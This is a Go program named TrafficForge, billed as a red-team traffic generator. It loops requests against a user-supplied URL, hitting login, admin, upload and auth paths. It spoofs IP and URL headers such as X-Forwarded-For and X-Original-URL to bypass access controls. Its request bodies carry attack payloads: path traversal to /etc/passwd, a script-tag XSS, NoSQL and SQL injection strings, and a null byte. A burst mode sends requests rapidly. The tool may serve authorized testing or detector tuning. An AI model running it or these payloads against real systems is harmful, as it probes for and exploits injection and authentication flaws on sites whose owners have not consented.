package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

var targets = []string{
	"/login",
	"/api/v1/user",
	"/api/v1/admin",
	"/upload",
	"/search?q=test",
	"/auth/refresh",
}

var methods = []string{"GET", "POST", "PUT", "DELETE", "PATCH"}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Mozilla/5.0 (X11; Linux x86_64)",
	"curl/7.68.0",
	"Wget/1.20.3",
	"python-requests/2.28.1",
}

var attackHeaders = []map[string]string{
	{"X-Forwarded-For": "127.0.0.1"},
	{"X-Originating-IP": "127.0.0.1"},
	{"X-Remote-IP": "127.0.0.1"},
	{"X-Client-IP": "127.0.0.1"},
	{"X-Original-URL": "/admin"},
}

func banner() {
	fmt.Println(`
████████╗██████╗  █████╗ ███████╗███████╗██╗ ██████╗ ██████╗ ███████╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔════╝ ██╔══██╗██╔════╝
   ██║   ██████╔╝███████║█████╗  █████╗  ██║██║  ███╗██████╔╝█████╗  
   ██║   ██╔══██╗██╔══██║██╔══╝  ██╔══╝  ██║██║   ██║██╔══██╗██╔══╝  
   ██║   ██║  ██║██║  ██║██║     ██║     ██║╚██████╔╝██║  ██║███████╗
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
TrafficForge — Red-Team Traffic Generator
`)
}

func randomHeaders() http.Header {
	h := http.Header{}
	h.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	h.Set("Accept", "*/*")

	if rand.Intn(100) < 40 {
		extra := attackHeaders[rand.Intn(len(attackHeaders))]
		for k, v := range extra {
			h.Set(k, v)
		}
	}

	return h
}

func randomBody() string {
	payloads := []string{
		"../../../../etc/passwd",
		"<script>alert(1)</script>",
		"{\"$ne\":null}",
		"admin' OR '1'='1",
		"%00",
	}

	if rand.Intn(100) < 50 {
		return payloads[rand.Intn(len(payloads))]
	}
	return ""
}

func sendRequest(base string) {
	path := targets[rand.Intn(len(targets))]
	method := methods[rand.Intn(len(methods))]

	req, _ := http.NewRequest(
		method,
		base+path,
		strings.NewReader(randomBody()),
	)

	req.Header = randomHeaders()

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Request failed")
		return
	}
	defer resp.Body.Close()

	fmt.Printf("[+] %s %s [%d]\n", method, path, resp.StatusCode)
}

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage:")
		fmt.Println("./trafficforge <BASE_URL> <MODE>")
		fmt.Println("Modes: slow | burst")
		return
	}

	banner()

	base := os.Args[1]
	mode := os.Args[2]

	rand.Seed(time.Now().UnixNano())

	fmt.Println("[*] Mode:", mode)

	for {
		sendRequest(base)

		if mode == "burst" {
			time.Sleep(time.Duration(rand.Intn(300)) * time.Millisecond)
		} else {
			time.Sleep(time.Duration(rand.Intn(5)+3) * time.Second)
		}
	}
}
